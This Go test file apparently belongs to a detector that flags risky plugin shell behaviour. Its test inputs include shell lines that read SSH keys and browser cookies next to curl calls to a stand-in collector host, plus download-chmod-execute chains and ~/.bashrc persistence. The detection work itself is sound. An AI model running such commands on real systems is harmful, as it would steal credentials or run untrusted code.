package analyze

import (
	"reflect"
	"strings"
	"testing"

	"github.com/SurreptitiousFabric/plug-and-prejudice/internal/report"
)

func TestSensitiveReadAndNetworkAreTraceableCoCapabilityInference(t *testing.T) {
	result := Sources(runtimeShell("cat ~/.ssh/id_ed25519\ncurl https://collector.example.test/upload\n"))
	finding := findingByCategory(t, result, "sensitive-data-and-network")
	if finding.Claim != report.ClaimInference || finding.Severity != report.SeverityHigh ||
		finding.Confidence != report.ConfidenceMedium || finding.Scope != report.ScopeRuntime ||
		len(finding.Evidence) != 2 || len(finding.Related) != 2 || finding.Provenance.RuleID != correlationRuleID {
		t.Fatalf("sensitive/network inference lost dimensions or evidence: %#v", finding)
	}
	if !strings.Contains(finding.Explanation, "has not established") {
		t.Fatalf("missing-data-flow caveat was omitted: %q", finding.Explanation)
	}
	assertRelatedOperationsExist(t, result, finding)
}

func TestBrowserSessionReadAndNetworkUseSameEvidenceRule(t *testing.T) {
	result := Sources(runtimeShell("cat ~/.config/chromium/Default/Cookies\ncurl https://collector.example.test/upload\n"))
	finding := findingByCategory(t, result, "sensitive-data-and-network")
	if !strings.Contains(finding.Explanation, "browser") || len(finding.Related) != 2 {
		t.Fatalf("browser-session correlation is not inspectable: %#v", finding)
	}
}

func TestSensitiveNetworkCorrelationRequiresBothCapabilities(t *testing.T) {
	for _, program := range []string{
		"cat ~/.ssh/id_ed25519\n",
		"curl https://ordinary.example.test/data\n",
		"cat ./keyring-design/notes\ncurl https://ordinary.example.test/data\n",
		"printf '%s' ~/.ssh/id_ed25519\ncurl https://ordinary.example.test/data\n",
	} {
		result := Sources(runtimeShell(program))
		if hasFindingCategory(result, "sensitive-data-and-network") {
			t.Fatalf("unestablished capability pair was correlated for %q: %#v", program, result.Findings)
		}
	}
}

func TestDynamicNetworkEndpointLowersCorrelationConfidence(t *testing.T) {
	result := Sources(runtimeShell("cat ~/.ssh/id_ed25519\ncurl \"$endpoint\"\n"))
	finding := findingByCategory(t, result, "sensitive-data-and-network")
	if finding.Confidence != report.ConfidenceLow || finding.Claim != report.ClaimInference {
		t.Fatalf("dynamic endpoint certainty was overstated: %#v", finding)
	}
}

func TestStartupPathWriteAndLaterExactInvocationAreCorrelated(t *testing.T) {
	result := Sources(runtimeShell("printf 'echo reviewed' > ~/.bashrc\nsource ~/.bashrc\n"))
	finding := findingByCategory(t, result, "persistence-and-execution")
	if finding.Claim != report.ClaimInference || finding.Severity != report.SeverityMedium ||
		finding.Confidence != report.ConfidenceMedium || len(finding.Related) != 2 ||
		finding.Provenance.RuleID != correlationRuleID {
		t.Fatalf("startup execution inference lost context: %#v", finding)
	}
	assertRelatedOperationsExist(t, result, finding)
}

func TestStartupExecutionRequiresLaterExactLiteralPath(t *testing.T) {
	for _, program := range []string{
		"source ~/.bashrc\nprintf x > ~/.bashrc\n",
		"printf x > ~/.bashrc\nsource ~/.profile\n",
		"printf x > \"$startup\"\nsource \"$startup\"\n",
		"printf x > ./ordinary\nsource ./ordinary\n",
	} {
		result := Sources(runtimeShell(program))
		if hasFindingCategory(result, "persistence-and-execution") {
			t.Fatalf("ambiguous or unrelated startup behavior was correlated for %q: %#v", program, result.Findings)
		}
	}
}

func TestDynamicPrivilegeSelectionIsExplicitInference(t *testing.T) {
	result := Sources(runtimeShell("sudo \"$helper\" --mode inspect\n"))
	finding := findingByCategory(t, result, "dynamic-privileged-execution")
	if finding.Claim != report.ClaimInference || finding.Severity != report.SeverityHigh ||
		finding.Confidence != report.ConfidenceMedium || len(finding.Related) != 1 ||
		finding.Provenance.RuleID != correlationRuleID || !strings.Contains(finding.Explanation, "cannot resolve") {
		t.Fatalf("dynamic privileged behavior was guessed or underexplained: %#v", finding)
	}
	if !hasLimitationCode(result, "command-wrapper-resolution") {
		t.Fatalf("unresolved privileged executable lacks limitation: %#v", result.Limitations)
	}
}

func TestSeparateDynamicAndPrivilegeOperationsDoNotClaimDataFlow(t *testing.T) {
	result := Sources(runtimeShell("eval \"$generated\"\nsudo true\n"))
	finding := findingByCategory(t, result, "dynamic-privileged-execution")
	if finding.Claim != report.ClaimInference || finding.Confidence != report.ConfidenceLow ||
		len(finding.Related) != 2 || !strings.Contains(finding.Explanation, "no data flow") {
		t.Fatalf("co-presence was promoted to established flow: %#v", finding)
	}
}

func TestStaticPrivilegeOperationDoesNotBecomeDynamicCorrelation(t *testing.T) {
	result := Sources(runtimeShell("sudo true\n"))
	if hasFindingCategory(result, "dynamic-privileged-execution") {
		t.Fatalf("static privilege request became dynamic inference: %#v", result.Findings)
	}
}

func TestStagedDownloadExecutableTransitionCitesThreeOperations(t *testing.T) {
	result := Sources(runtimeShell("curl -o ./payload https://example.test/payload\nchmod +x ./payload\n./payload\n"))
	finding := findingByCategory(t, result, "download-and-execute")
	if len(finding.Evidence) != 3 || len(finding.Related) != 3 ||
		!strings.Contains(finding.Title, "marks it executable") || finding.Provenance.RuleID != correlationRuleID {
		t.Fatalf("three-step download chain is incomplete: %#v", finding)
	}
	assertRelatedOperationsExist(t, result, finding)
}

func TestNonExecutableModeChangeDoesNotEnterDownloadChain(t *testing.T) {
	for _, mode := range []string{"600", "1644", "a+X", "u-x"} {
		result := Sources(runtimeShell("curl -o ./payload https://example.test/payload\nchmod " + mode + " ./payload\nbash ./payload\n"))
		finding := findingByCategory(t, result, "download-and-execute")
		if len(finding.Related) != 2 || strings.Contains(finding.Title, "marks it executable") {
			t.Fatalf("chmod %s was promoted into an executable transition: %#v", mode, finding)
		}
	}
}

func TestLiteralExecutableModesEnterDownloadChain(t *testing.T) {
	for _, mode := range []string{"755", "0755", "u+x", "u=rwx,go=r"} {
		result := Sources(runtimeShell("curl -o ./payload https://example.test/payload\nchmod " + mode + " ./payload\n./payload\n"))
		finding := findingByCategory(t, result, "download-and-execute")
		if len(finding.Related) != 3 || !strings.Contains(finding.Title, "marks it executable") {
			t.Fatalf("chmod %s executable transition was missed: %#v", mode, finding)
		}
	}
}

func TestCorrelationIDsAndOrderingAreDeterministic(t *testing.T) {
	program := "cat ~/.ssh/id_ed25519\ncurl https://collector.example.test\nprintf x > ~/.bashrc\nsource ~/.bashrc\n"
	first := Sources(runtimeShell(program))
	second := Sources(runtimeShell(program))
	if !reflect.DeepEqual(first.Findings, second.Findings) {
		t.Fatalf("correlation findings changed across identical runs:\nfirst %#v\nsecond %#v", first.Findings, second.Findings)
	}
}

func TestRepeatedSensitiveResourcesForOneOperationDoNotAmplifyCorrelation(t *testing.T) {
	result := Sources(runtimeShell("cat ~/.ssh/id_rsa ~/.ssh/id_ed25519\ncurl https://collector.example.test\n"))
	if countFindingCategory(result, "sensitive-data-and-network") != 1 {
		t.Fatalf("one operation amplified into repeated correlations: %#v", result.Findings)
	}
}

func TestCorrelationRespectsFindingProductionBudget(t *testing.T) {
	readEvidence := report.Evidence{Path: "plugin.sh", LineStart: 1, LineEnd: 1, Operation: "cat ~/.ssh/id_ed25519"}
	networkEvidence := report.Evidence{Path: "plugin.sh", LineStart: 2, LineEnd: 2, Operation: "curl https://collector.example.test"}
	result := Result{
		Operations: []report.Operation{
			{ID: "read", Category: "process-execution", Command: "cat", Confidence: report.ConfidenceHigh, Evidence: readEvidence},
			{ID: "network", Category: "process-execution", Command: "curl", Confidence: report.ConfidenceHigh, Evidence: networkEvidence},
		},
		Resources: []report.Resource{
			{ID: "sensitive", Kind: "filesystem-path", Access: "read", Value: "~/.ssh/id_ed25519", Sensitive: true, Confidence: report.ConfidenceHigh, Evidence: readEvidence, RelatedOperationID: "read"},
			{ID: "domain", Kind: "network-domain", Access: "connect", Value: "collector.example.test", Confidence: report.ConfidenceHigh, Evidence: networkEvidence, RelatedOperationID: "network"},
		},
		Findings: make([]report.Finding, maxProducedFindings),
	}
	correlateBehaviorCombinations(&result)
	if len(result.Findings) != maxProducedFindings || !hasLimitationCode(result, "result-production-limit") {
		t.Fatalf("correlation bypassed or silently hit finding budget: findings=%d limitations=%#v", len(result.Findings), result.Limitations)
	}
}

func TestCorrelationRespectsEvidenceRelationshipProductionBudget(t *testing.T) {
	evidence := report.Evidence{Path: "plugin.sh", LineStart: 1, LineEnd: 1, Operation: "dynamic"}
	result := Result{retainedRelationshipCount: maxProducedRelationships}
	finding := report.Finding{
		ID: "finding", Claim: report.ClaimInference, Severity: report.SeverityHigh, Confidence: report.ConfidenceMedium,
		Category: "correlation", Title: "Correlation", Explanation: "Bounded relationship.", Evidence: []report.Evidence{evidence},
		Related: []string{"operation"}, Provenance: sourceProvenance(correlationRuleID),
	}
	if appendFinding(&result, finding) || len(result.Findings) != 0 || !hasLimitationCode(result, "result-production-limit") {
		t.Fatalf("finding bypassed or silently hit relationship budget: %#v", result)
	}
	result = Result{retainedRelationshipCount: maxProducedRelationships}
	resource := report.Resource{ID: "resource", Kind: "network-domain", Access: "connect", Value: "example.test", Evidence: evidence, RelatedOperationID: "operation", Provenance: sourceProvenance("test/v1")}
	if appendResource(&result, resource) || len(result.Resources) != 0 || !hasLimitationCode(result, "result-production-limit") {
		t.Fatalf("resource bypassed or silently hit relationship budget: %#v", result)
	}
}

func TestMalformedSourceCannotCreateBehaviorCorrelation(t *testing.T) {
	result := Sources(runtimeShell("cat ~/.ssh/id_ed25519\n$(\n"))
	if hasFindingCategory(result, "sensitive-data-and-network") || hasFindingCategory(result, "persistence-and-execution") {
		t.Fatalf("malformed source produced unsupported relationship: %#v", result.Findings)
	}
}

func assertRelatedOperationsExist(t *testing.T, result Result, finding report.Finding) {
	t.Helper()
	operations := make(map[string]bool, len(result.Operations))
	for _, operation := range result.Operations {
		operations[operation.ID] = true
	}
	for _, id := range finding.Related {
		if !operations[id] {
			t.Fatalf("finding %q references missing operation %q", finding.ID, id)
		}
	}
}
